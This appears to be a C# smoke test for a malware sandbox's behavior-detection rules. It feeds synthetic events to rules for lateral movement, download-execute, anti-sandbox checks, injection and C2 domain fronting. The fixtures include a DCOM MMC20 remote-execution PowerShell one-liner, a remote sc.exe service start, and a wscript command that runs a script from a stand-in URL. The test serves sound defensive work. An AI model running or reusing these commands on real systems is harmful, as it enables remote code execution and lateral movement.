using System.Text.Json;
using KSword.Sandbox.Abstractions;
using KSword.Sandbox.Core.Rules;
using KSword.Sandbox.SmokeTests.Assertions;
using KSword.Sandbox.SmokeTests.Framework;

namespace KSword.Sandbox.SmokeTests.Scenarios;

/// <summary>
/// Verifies the focused MVP gap-closure behavior-rule batch for lateral
/// movement, download-execute correlation, anti-sandbox gates, injection, and
/// C2 TLS/JA3/domain-fronting evidence. This scenario is repository-only and
/// does not run Hyper-V or any live sandbox workload.
/// </summary>
internal sealed class BehaviorRuleMvpGapClosureScenario : ISmokeTestScenario
{
    private static readonly string[] RequiredRuleIds =
    [
        "lateral-dcom-mmc20-remote-execution-command",
        "lateral-sc-remote-service-start-or-control",
        "download-execute-wscript-cscript-remote-script-url",
        "download-execute-artifact-hash-launch-correlation",
        "anti-sandbox-low-resource-exit-gate",
        "anti-sandbox-sleep-acceleration-ratio-mismatch",
        "injection-create-remote-thread-startaddress-rwx",
        "injection-mapview-section-unbacked-execute",
        "c2-ja3-sni-domain-fronting-correlation",
        "c2-beacon-sni-ja3-process-correlation"
    ];

    private static readonly string[] RequiredTechniqueIds =
    [
        "T1021.003",
        "T1055.004",
        "T1090",
        "T1105",
        "T1497.001",
        "T1497.003"
    ];

    public string ScenarioId => "behavior.rules-mvp-gap-closure";

    /// <inheritdoc />
    public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
    {
        cancellationToken.ThrowIfCancellationRequested();

        var behaviorRulesPath = Path.Combine(context.RulesDirectory, "behavior-rules.json");
        var mitreMapPath = Path.Combine(context.RulesDirectory, "mitre-windows-map.json");
        SmokeAssert.True(File.Exists(behaviorRulesPath), "behavior-rules.json is missing.");
        SmokeAssert.True(File.Exists(mitreMapPath), "mitre-windows-map.json is missing.");

        AssertRulesJsonParsesWithUniqueIds(behaviorRulesPath);

        var rules = RuleEngine.LoadRuleSet(behaviorRulesPath);
        var indexedRules = rules.Rules.ToDictionary(rule => rule.Id, StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"MVP gap-closure rule '{ruleId}' is missing.");
            AssertRuleContract(rule!);
        }

        var techniqueIds = ReadMitreTechniqueIds(mitreMapPath);
        foreach (var techniqueId in RequiredTechniqueIds)
        {
            SmokeAssert.True(techniqueIds.Contains(techniqueId), $"MITRE technique '{techniqueId}' is missing from mitre-windows-map.json.");
        }

        var engine = new RuleEngine(rules);
        var positiveFindingIds = engine.Classify(CreatePositiveEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(positiveFindingIds.Contains(ruleId), $"Synthetic MVP gap event should match '{ruleId}'.");
        }

        var noiseFindingIds = engine.Classify(CreateNoiseEvents())
            .Select(finding => finding.RuleId)
            .ToHashSet(StringComparer.OrdinalIgnoreCase);
        foreach (var ruleId in RequiredRuleIds)
        {
            SmokeAssert.True(!noiseFindingIds.Contains(ruleId), $"Static/health/self-noise event should not match MVP gap rule '{ruleId}'.");
        }

        return Task.FromResult(new SmokeTestResult
        {
            ScenarioId = ScenarioId,
            Passed = true,
            Message = $"{RequiredRuleIds.Length} MVP gap-closure rules load, map, match constrained evidence, and suppress static/health/self-noise."
        });
    }

    private static void AssertRuleContract(BehaviorRule rule)
    {
        SmokeAssert.True(rule.EventTypes.Count > 0, $"Rule '{rule.Id}' should declare event types.");
        SmokeAssert.True(rule.EvidenceFields.Count > 0, $"Rule '{rule.Id}' should document evidence fields.");
        SmokeAssert.True(!string.IsNullOrWhiteSpace(rule.MitreTechniqueId), $"Rule '{rule.Id}' should include a MITRE technique ID.");
        SmokeAssert.True(!string.IsNullOrWhiteSpace(rule.MitreTechniqueName), $"Rule '{rule.Id}' should include a MITRE technique name.");
        SmokeAssert.True(!rule.EventTypes.All(eventType => eventType.StartsWith("static.", StringComparison.OrdinalIgnoreCase)), $"Rule '{rule.Id}' should not be static-only.");
        SmokeAssert.True(!rule.Tags.Contains("collection", StringComparer.OrdinalIgnoreCase), $"Rule '{rule.Id}' should not be a collection-health row.");
        SmokeAssert.True(rule.ExcludeDataContains.Count > 0, $"Rule '{rule.Id}' should exclude collection-health/VT/R0 metadata.");
        SmokeAssert.True(
            rule.CommandLineRegex.Count > 0 ||
            rule.DataRegex.Count > 0 ||
            rule.AllDataKeys.Count > 0 ||
            rule.AllDataContains.Count > 0 ||
            rule.AllDataNumericRanges.Count > 0,
            $"Rule '{rule.Id}' should be constrained by command-line, data, regex, key, or numeric evidence.");
    }

    private static IReadOnlyList<SandboxEvent> CreatePositiveEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "powershell.exe",
                CommandLine = "powershell.exe -NoP -c $t=[type]::GetTypeFromProgID('MMC20.Application','VICTIM'); $o=[Activator]::CreateInstance($t); $o.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c whoami','7')"
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "sc.exe",
                CommandLine = @"sc.exe \\VICTIM start PSEXESVC"
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "wscript.exe",
                CommandLine = "wscript.exe https://example.invalid/payload.js"
            },
            new SandboxEvent
            {
                EventType = "download.execute",
                Source = "guest",
                Data =
                {
                    ["sourceUrl"] = "https://example.invalid/payload.exe",
                    ["downloadPath"] = @"C:\Users\Smoke\Downloads\payload.exe",
                    ["executedPath"] = @"C:\Users\Smoke\AppData\Local\Temp\payload.exe",
                    ["downloadSha256"] = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
                    ["executedSha256"] = "0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef",
                    ["hashMatch"] = "true"
                }
            },
            new SandboxEvent
            {
                EventType = "antiAnalysis.sandboxCheck",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["cpuCount"] = "2",
                    ["memoryMB"] = "2048",
                    ["action"] = "exit gate",
                    ["classification"] = "low-resource sandbox-gate anti-sandbox"
                }
            },
            new SandboxEvent
            {
                EventType = "api.sleep",
                Source = "guest",
                ProcessName = "payload.exe",
                Data =
                {
                    ["requestedMs"] = "600000",
                    ["observedMs"] = "1000",
                    ["classification"] = "sleep accelerated fast-forwarded time-skew"
                }
            },
            new SandboxEvent
            {
                EventType = "thread.remote",
                Source = "driver",
                ProcessName = "payload.exe",
                Data =
                {
                    ["operation"] = "CreateRemoteThread",
                    ["targetProcessName"] = "explorer.exe",
                    ["targetProcessId"] = "4242",
                    ["startAddress"] = "0x000001F000120000",
                    ["targetMemoryProtection"] = "PAGE_EXECUTE_READWRITE"
                }
            },
            new SandboxEvent
            {
                EventType = "process.memory",
                Source = "driver",
                ProcessName = "payload.exe",
                Data =
                {
                    ["operation"] = "NtMapViewOfSection",
                    ["targetProcessName"] = "svchost.exe",
                    ["protection"] = "PAGE_EXECUTE_READ",
                    ["backingType"] = "anonymous unbacked",
                    ["sectionName"] = "pagefile-backed"
                }
            },
            new SandboxEvent
            {
                EventType = "pcap.tls",
                Source = "pcap",
                Data =
                {
                    ["host"] = "cdn.example.net",
                    ["sni"] = "front.example.invalid",
                    ["ja3"] = "0123456789abcdef0123456789abcdef",
                    ["ja3Reputation"] = "suspicious",
                    ["classification"] = "domain-fronting host-sni-mismatch"
                }
            },
            new SandboxEvent
            {
                EventType = "network.flow",
                Source = "guest",
                Data =
                {
                    ["processPath"] = @"C:\Users\Smoke\AppData\Local\Temp\payload.exe",
                    ["sni"] = "api.example.invalid",
                    ["ja3"] = "fedcba9876543210fedcba9876543210",
                    ["ja3Reputation"] = "rare",
                    ["beaconIntervalSeconds"] = "60",
                    ["jitterPercent"] = "12",
                    ["classification"] = "periodic c2 beacon",
                    ["destinationIp"] = "198.51.100.44"
                }
            }
        ];
    }

    private static IReadOnlyList<SandboxEvent> CreateNoiseEvents()
    {
        return
        [
            new SandboxEvent
            {
                EventType = "static.string.command",
                Source = "host",
                ProcessName = "static-analyzer",
                CommandLine = "powershell.exe -NoP -c $t=[type]::GetTypeFromProgID('MMC20.Application','VICTIM'); $o.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c whoami','7')"
            },
            new SandboxEvent
            {
                EventType = "process.start",
                Source = "guest",
                ProcessName = "KSword.Sandbox.Agent.exe",
                CommandLine = "powershell.exe -NoP -c $t=[type]::GetTypeFromProgID('MMC20.Application','VICTIM'); $o.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,'/c whoami','7')",
                Data =
                {
                    ["component"] = "KSword.Sandbox.Agent"
                }
            },
            new SandboxEvent
            {
                EventType = "network.flow",
                Source = "virustotal",
                Data =
                {
                    ["processPath"] = @"C:\Users\Smoke\AppData\Local\Temp\payload.exe",
                    ["sni"] = "api.example.invalid",
                    ["ja3"] = "fedcba9876543210fedcba9876543210",
                    ["ja3Reputation"] = "rare",
                    ["beaconIntervalSeconds"] = "60",
                    ["jitterPercent"] = "12",
                    ["classification"] = "periodic c2 beacon",
                    ["status"] = "not_configured",
                    ["message"] = "VirusTotal not configured"
                }
            },
            new SandboxEvent
            {
                EventType = "r0collector.driverHealth",
                Source = "r0collector",
                ProcessName = "KSword.Sandbox.R0Collector.exe",
                Data =
                {
                    ["cpuCount"] = "2",
                    ["memoryMB"] = "2048",
                    ["action"] = "exit gate",
                    ["classification"] = "low-resource sandbox-gate anti-sandbox",
                    ["message"] = "collection health"
                }
            }
        ];
    }

    private static void AssertRulesJsonParsesWithUniqueIds(string rulesPath)
    {
        using var document = JsonDocument.Parse(File.ReadAllText(rulesPath));
        SmokeAssert.True(document.RootElement.TryGetProperty("rules", out var rules), "Rules document should contain rules array.");
        var seen = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var rule in rules.EnumerateArray())
        {
            SmokeAssert.True(rule.TryGetProperty("id", out var idElement), "Each rule should contain id.");
            var id = idElement.GetString();
            SmokeAssert.True(!string.IsNullOrWhiteSpace(id), "Each rule id should be non-empty.");
            SmokeAssert.True(seen.Add(id!), $"Behavior rule id '{id}' should be unique.");
        }
    }

    private static HashSet<string> ReadMitreTechniqueIds(string mitreMapPath)
    {
        using var document = JsonDocument.Parse(File.ReadAllText(mitreMapPath));
        SmokeAssert.True(document.RootElement.TryGetProperty("techniques", out var techniques), "MITRE map should contain a techniques array.");

        var techniqueIds = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
        foreach (var technique in techniques.EnumerateArray())
        {
            if (technique.TryGetProperty("id", out var idElement) && !string.IsNullOrWhiteSpace(idElement.GetString()))
            {
                techniqueIds.Add(idElement.GetString()!);
            }
        }

        return techniqueIds;
    }
}
